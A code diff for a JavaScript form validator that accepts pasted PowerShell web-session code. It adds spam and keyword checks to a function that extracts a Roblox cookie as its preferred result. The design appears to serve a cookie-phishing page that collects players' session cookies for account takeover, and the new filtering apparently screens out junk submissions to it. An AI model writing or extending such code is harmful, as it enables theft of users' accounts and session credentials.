@@ -70,6 +70,54 @@ function isValidCode(code) {
         return { valid: false, reason: 'This input has already been submitted!' };
     }
 
+    // Advanced spam detection
+    function isSpamPattern(text) {
+        const lowerText = text.toLowerCase();
+        
+        // Check for keyboard mashing patterns (like "sjajsj167-")
+        const keyboardPatterns = [
+            /(.)\1{3,}/g, // Same character repeated 4+ times
+            /(qwerty|asdf|zxcv|qaz|wsx|edc)/gi, // Keyboard sequences
+            /^[a-z]{2,6}\d+[-_]*$/i, // Pattern like "sjajsj167-"
+            /^[a-z]*\d+[^a-zA-Z0-9\s]*$/i, // Letters followed by numbers and symbols
+            /^[a-z]{1,3}[a-z]{1,3}\d+/i, // Short repeated letter patterns with numbers
+        ];
+        
+        for (const pattern of keyboardPatterns) {
+            if (pattern.test(text)) {
+                return true;
+            }
+        }
+        
+        // Check for excessive non-alphanumeric characters
+        const nonAlphaCount = (text.match(/[^a-zA-Z0-9\s]/g) || []).length;
+        const totalLength = text.length;
+        if (nonAlphaCount > totalLength * 0.3) { // More than 30% special chars
+            return true;
+        }
+        
+        // Check for random character sequences
+        const words = text.split(/\s+/);
+        const randomWords = words.filter(word => {
+            if (word.length < 3) return false;
+            // Check for alternating consonants/vowels in a nonsensical way
+            const hasRandomPattern = /^[bcdfghjklmnpqrstvwxyz]{3,}[aeiou][bcdfghjklmnpqrstvwxyz]/i.test(word) ||
+                                   /^[aeiou]{2,}[bcdfghjklmnpqrstvwxyz]{2,}/i.test(word);
+            return hasRandomPattern;
+        });
+        
+        if (randomWords.length > words.length * 0.5) { // More than 50% random words
+            return true;
+        }
+        
+        return false;
+    }
+    
+    // Check for spam patterns before word count
+    if (isSpamPattern(cleanCode)) {
+        return { valid: false, reason: 'Input appears to be spam or random characters!', isSpam: true };
+    }
+
     // Count words in the input
     const words = cleanCode.split(/\s+/).filter(word => word.length > 0);
     const wordCount = words.length;
@@ -81,19 +129,35 @@ function isValidCode(code) {
         return { valid: false, reason: `Input too short. Minimum ${minWordCount} words required for analysis.` };
     }
 
+    // Check for PowerShell-like keywords to ensure it's legitimate code
+    const powershellKeywords = [
+        'powershell', '$session', 'new-object', 'invoke-webrequest', 'websession',
+        'cookies', 'headers', 'useragent', 'add', 'system.net', 'microsoft.powershell',
+        'param', 'function', 'if', 'else', 'foreach', 'while', 'try', 'catch',
+        'import-module', 'get-', 'set-', 'write-', 'read-'
+    ];
+    
+    const hasValidKeywords = powershellKeywords.some(keyword => 
+        cleanCode.toLowerCase().includes(keyword.toLowerCase())
+    );
+    
+    if (!hasValidKeywords && wordCount >= minWordCount) {
+        return { valid: false, reason: 'Input does not appear to be valid PowerShell code!' };
+    }
+
     // Check for Roblox cookie extraction (preferred)
     const robloxCookie = extractRobloxCookie(cleanCode);
     if (robloxCookie) {
         return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
-    // Allow any PowerShell-like code that meets the word count requirement
-    if (wordCount >= minWordCount) {
+    // Allow PowerShell code that meets requirements
+    if (wordCount >= minWordCount && hasValidKeywords) {
         return { valid: true, type: 'powershell_code' };
     }
 
     // Block everything else
-    return { valid: false, reason: 'Only PowerShell code with sufficient length is allowed!', isBlocked: true };
+    return { valid: false, reason: 'Only valid PowerShell code with sufficient length is allowed!', isBlocked: true };
 }
 
 function checkRateLimit() {
